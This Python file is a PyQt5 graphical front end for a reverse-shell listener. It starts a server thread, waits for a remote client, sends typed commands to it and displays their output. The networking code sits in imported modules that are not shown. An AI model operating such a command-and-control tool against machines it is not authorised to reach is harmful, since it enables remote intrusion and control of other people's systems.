import socket
import sys
from gui import *
from server import *
from PyQt5.QtCore import QObject, QThread, pyqtSignal

class reverse_shell():

    def __init__(self):
        # GUI main thread
        self.app = QtWidgets.QApplication(sys.argv)

    def make_ui(self):
        # Instantiate the main window
        self.mainWindow = QtWidgets.QMainWindow()
        # Instantiate the UI
        self.ui = Ui_MainWindow()
        # Call the setupUi method
        self.ui.setupUi(self.mainWindow)
        self.ui.main_window = self.mainWindow

        # disable the send button until client connects
        self.ui.send.setEnabled(False)
        # disable editing of output
        self.ui.output.setReadOnly(True)
        # disable end server button
        self.ui.disconnect.setEnabled(False)
        # connect button logic
        self.ui.connect.clicked.connect(self.start_server)

        # Show the window
        self.mainWindow.show()
        # Run the event loop
        sys.exit(self.app.exec_())

    def start_server(self):
        #disable start server button
        self.ui.connect.setEnabled(False)
        #enable end server button
        self.ui.disconnect.setEnabled(True)

        # make thread to run server script
        self.server = QThread()
        self.worker = worker()
        self.worker.moveToThread(self.server)
        self.server.started.connect(self.worker.start_server)

        #custom slots for sentCommand signal
        self.worker.sentCommand.connect(self.change_output)

        # send button logic
        self.ui.cmd.returnPressed.connect(lambda: self.worker.send_commands(self.ui.cmd.text()))
        self.ui.send.clicked.connect(lambda: self.worker.send_commands(self.ui.cmd.text()))

        # disconnect button logic
        self.ui.disconnect.clicked.connect(self.end_server)

        #start thread
        try:
            self.server.start()
            self.ui.status.setText("Server is Live! Waiting for client ...")
        except:
            self.ui.status.setText("Error occured starting the server")

        # On succesful connection make changes to ui  
        self.worker.conn_estabilished.connect(lambda ip: self.ui.status.setText(f'Succesfully connected to {ip}'))
        self.worker.conn_estabilished.connect(lambda ip: self.ui.send.setEnabled(True))

    # end the server thread
    def end_server(self):
        try:
            self.worker.stop_server()
            self.server.quit()
            self.worker.deleteLater()
            self.server.deleteLater()
        except:
            print("problem ending worker thread")

    # change output on successful connection
    def change_output(self, message):
        try:
            self.ui.status.setText(f'Successfully executed {message[0]} on {message[1]}')
            self.ui.output.setText(message[2])
        except:
            print("Error changing output label")

reverse_shell = reverse_shell()
reverse_shell.make_ui()
reverse_shell.start_server()
